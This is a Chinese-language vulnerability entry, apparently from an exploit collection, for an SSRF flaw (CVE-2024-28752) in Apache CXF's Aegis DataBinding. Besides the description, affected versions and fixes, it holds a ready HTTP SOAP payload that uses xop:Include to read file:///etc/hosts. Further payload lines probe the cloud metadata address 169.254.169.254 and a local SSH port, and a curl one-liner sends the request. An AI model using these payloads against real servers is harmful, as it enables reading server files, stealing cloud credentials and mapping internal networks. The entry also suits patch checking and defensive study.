Vuln/web/apache-cxf/CVE-2024-28752.md

---
id: CVE-2024-28752
title: Apache CXF Aegis DataBinding SSRF漏洞 (CVE-2024-28752)
product: apache-cxf
vendor: Apache
version_affected: "<4.0.4, <3.6.3, <3.5.8"
severity: HIGH
tags: [ssrf, 无需认证]
fingerprint: ["Apache CXF", "JAX-WS", "SOAP"]
---

## 漏洞描述

Apache CXF在4.0.4、3.6.3和3.5.8版本之前存在使用Aegis DataBinding的SSRF漏洞。攻击者可以通过让服务器向任意URL发送请求来访问内部资源或探测内网服务。

## 影响版本

- Apache CXF < 4.0.4
- Apache CXF < 3.6.3
- Apache CXF < 3.5.8

## 前置条件

- 服务使用Aegis DataBinding（非默认）
- 能够访问CXF Web服务

## 利用步骤

1. 发送SOAP请求到CXF服务端点
2. 利用XOPInclude引用file://或其他协议URL
3. 服务器会请求指定URL并返回结果

## Payload

```http
POST /test HTTP/1.1
Host: target:8080
Content-Type: multipart/related; boundary=----kkkkkk123123213
Content-Length: 472

------kkkkkk123123213
Content-Disposition: form-data; name="1"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.namespace/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:test>
         <arg0>
<count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/hosts"></xop:Include></count>
</arg0>
      </web:test>
   </soapenv:Body>
</soapenv:Envelope>
------kkkkkk123123213--

# 内网探测
<xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="http://169.254.169.254/latest/meta-data/"></xop:Include>
<xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="http://127.0.0.1:22/"></xop:Include>
```

## 验证方法

```bash
# 发送SSRF payload后检查响应
curl -X POST "http://target:8080/test" \
  -H "Content-Type: multipart/related; boundary=----kkkkkk123123213" \
  -d '------kkkkkk123123213\r\nContent-Disposition: form-data; name="1"\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><web:test><arg0><count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/hosts"></xop:Include></count></arg0></web:test></soapenv:Body></soapenv:Envelope>\r\n------kkkkkk123123213--'
```

## 修复建议

1. 升级Apache CXF至4.0.4、3.6.3或3.5.8或更高版本
2. 避免使用Aegis DataBinding
3. 对URL参数进行严格验证
4. 限制服务器出站请求
